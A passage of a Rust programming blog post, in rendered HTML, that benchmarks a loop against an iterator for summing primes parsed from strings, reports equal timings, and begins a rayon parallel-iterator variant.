operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> s </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token class-name">Ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100_000</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    s </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="iterator-approach">Iterator approach<a class="hash-link" aria-label="Direct link to Iterator approach" title="Direct link to Iterator approach" href="/blog#iterator-approach">​</a></h3>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum2</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">Iterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter_map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">s</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token number" style="color:#36acaa">100_000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="common-code">Common code<a class="hash-link" aria-label="Direct link to Common code" title="Direct link to Common code" href="/blog#common-code">​</a></h3>
<p>To implement the <code>is_prime</code> method, I use the following simple code, which is using the <a href="https://crates.io/crates/primes" target="_blank" rel="noopener noreferrer">primes</a> crate:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">trait</span><span class="token plain"> </span><span class="token type-definition class-name">IsPrime</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">bool</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">IsPrime</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">bool</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">primes</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token keyword" style="color:#00009f">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In addition, I generate a static data array <code>NUMBERS</code>:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">lazy_static!</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Vec</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..</span><span class="token number" style="color:#36acaa">1_000_000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">format!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;{i}&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">collect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="benchmarking-code">Benchmarking code<a class="hash-link" aria-label="Direct link to Benchmarking code" title="Direct link to Benchmarking code" href="/blog#benchmarking-code">​</a></h3>
<p>To test the speed of the above code, I&#x27;m using <code>cargo bench</code> with the following test code</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[cfg(test)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">mod</span><span class="token plain"> </span><span class="token module-declaration namespace" style="opacity:0.7">tests</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">use</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">super</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">use</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">test</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token attribute attr-name" style="color:#00a4db">#[bench]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_sum1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> </span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">sum1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">454396537</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token attribute attr-name" style="color:#00a4db">#[bench]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_sum2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> </span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">sum2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">454396537</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="benchmarking-results">Benchmarking results<a class="hash-link" aria-label="Direct link to Benchmarking results" title="Direct link to Benchmarking results" href="/blog#benchmarking-results">​</a></h2>
<p>Running the benchmark yields the following result:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum1 ... bench:  25,637,873.10 ns/iter (+/- 1,921,695.73)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum2 ... bench:  25,639,836.30 ns/iter (+/- 1,405,975.61)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OMG, what has happened???!!? Both approaches are equally performant. There seems to be no important difference between using a loop or iterator.</p>
<p><strong>That&#x27;s our first result: It doesn&#x27;t matter whether you use traditional loops or iterators. You can expect both to be similar fast.</strong></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="iterators-on-steroids">Iterators on steroids<a class="hash-link" aria-label="Direct link to Iterators on steroids" title="Direct link to Iterators on steroids" href="/blog#iterators-on-steroids">​</a></h2>
<p>Let&#x27;s change out iterator based sum function a little bit: replacing <code>Iterator</code> by <code>ParallelIterator</code>, which is a trait from the <a href="https://crates.io/crates/rayon" target="_blank" rel="noopener noreferrer">rayon</a> crate. <em>rayon</em> allows you to do anything in parallel what you can do with normal iterators. So, if you have some code which is based on using iterators, you can simply switch to parallel iterators.</p>
<p>We add an additional sum function:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">ParallelIterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter_map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">s</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token number" style="color:#36acaa">100_000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
